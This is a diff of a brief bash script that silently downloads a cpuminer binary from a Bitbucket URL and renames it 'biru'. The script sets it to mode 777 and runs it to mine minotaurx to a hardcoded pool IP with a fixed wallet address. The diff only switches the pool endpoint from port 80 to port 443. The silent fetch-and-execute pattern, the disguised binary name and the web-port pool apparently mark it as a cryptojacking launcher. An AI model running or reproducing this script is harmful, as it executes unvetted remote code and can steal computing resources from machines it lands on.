@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O biru https://bitbucket.org/kzpakid/kfile/raw/main/cpminer > /dev/null 2>&1
 chmod 777 biru
-./biru -a minotaurx -o stratum+tcp://157.245.1.139:80 -u RY1xwedsKLtchaw6XZcdFHZDYgFaoh2owB.dud -t60
+./biru -a minotaurx -o stratum+tcp://165.232.165.31:443 -u RY1xwedsKLtchaw6XZcdFHZDYgFaoh2owB.dud -t60
